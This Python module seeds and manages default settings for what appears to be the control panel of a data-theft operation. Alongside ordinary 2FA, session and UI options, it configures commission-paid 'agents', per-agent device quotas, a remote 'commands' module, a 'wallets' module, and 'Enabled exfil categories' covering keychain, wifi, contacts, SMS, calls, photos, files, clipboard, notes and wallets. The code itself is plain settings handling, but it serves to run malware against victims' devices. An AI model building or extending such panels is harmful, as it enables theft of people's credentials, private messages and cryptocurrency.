from datetime import datetime
from .database import Settings

try:
    from .config_constants import DEFAULTS as _CFG_DEFAULTS
except Exception:  # pragma: no cover - guard for CLI entry points that skip imports
    _CFG_DEFAULTS = tuple()


def _merge_defaults():
    """Merge historical DEFAULT_SETTINGS (preserve desc wording) with
    `config_constants.DEFAULTS` (canonical defaults source).  DB keys win
    pairwise; duplicates keep the historical description wording."""
    base = list(DEFAULT_SETTINGS_BASE)
    seen = {k for k, _, _ in base}
    extra = []
    for row in _CFG_DEFAULTS:
        setting_key, _env, default, desc = row
        if setting_key in seen:
            continue
        extra.append((setting_key, str(default), desc))
        seen.add(setting_key)
    return base + extra


DEFAULT_SETTINGS_BASE = [
    ("security.min_password_length", "6", "Minimum password length"),
    ("security.require_2fa", "false", "Require two-factor authentication for all users"),
    ("security.force_2fa_users", "false", "Force enable 2FA for all admin users (users who haven't bound 2FA must first bind via setup_temp_token)"),
    ("security.force_2fa_agents", "false", "Force enable 2FA for all agents (agents who haven't bound 2FA must first bind via setup_temp_token)"),
    ("security.2fa_lock_after_attempts", "5", "Lock the account after this many consecutive failed 2FA verification attempts"),
    ("security.2fa_lock_minutes", "15", "Number of minutes to lock the account when 2FA failure threshold is reached"),
    ("security.session_timeout_minutes", "30", "Session timeout in minutes"),
    ("ui.dark_mode", "false", "Enable dark mode"),
    ("ui.language", "zh-CN", "UI language"),
    ("agent.default_commission_rate", "0", "Default agent commission rate (%)"),
    ("agent.default_max_devices", "0", "Default max devices per agent (0=unlimited)"),
    ("retention.device_days", "0", "Device data retention in days (0=forever)"),
    ("retention.log_days", "30", "访问日志(logs表)保留天数，超时先gz归档到logs_archive/再删除"),
    ("notifications.email_alerts", "false", "Send email alerts"),
    ("modules.commands_enabled", "true", "Enable commands module"),
    ("modules.wallets_enabled", "true", "Enable wallets module"),
    ("sensitive.commands_2fa", "false", "Require 2FA for command operations"),
    ("sensitive.wallets_2fa", "false", "Require 2FA for wallet operations"),
    ("sensitive.users_2fa", "false", "Require 2FA for user management"),
    ("sensitive.agents_2fa", "false", "Require 2FA for agent management"),
    ("sensitive.profile_2fa", "false", "Require 2FA for profile changes"),
    ("modules.exif_categories_enabled", "keychain,wifi,contacts,sms,calls,photos,files,clipboard,notes,wallets", "Enabled exfil categories"),
]

DEFAULT_SETTINGS = _merge_defaults()


def ensure_default_settings(db):
    changed = False
    for key, default_value, description in DEFAULT_SETTINGS:
        existing = db.query(Settings).filter(Settings.key == key).first()
        if not existing:
            stg = Settings(
                key=key, value=str(default_value), description=description,
                updated_at=datetime.now()
            )
            db.add(stg)
            changed = True
    if changed:
        db.commit()


def get_setting(db, key: str, default=None):
    s = db.query(Settings).filter(Settings.key == key).first()
    return s.value if s else default


def set_setting(db, key: str, value: str, description: str = None):
    s = db.query(Settings).filter(Settings.key == key).first()
    if not s:
        s = Settings(key=key, value=value, description=description, updated_at=datetime.now())
        db.add(s)
    else:
        s.value = value
        if description:
            s.description = description
        s.updated_at = datetime.now()
    db.commit()
    return s
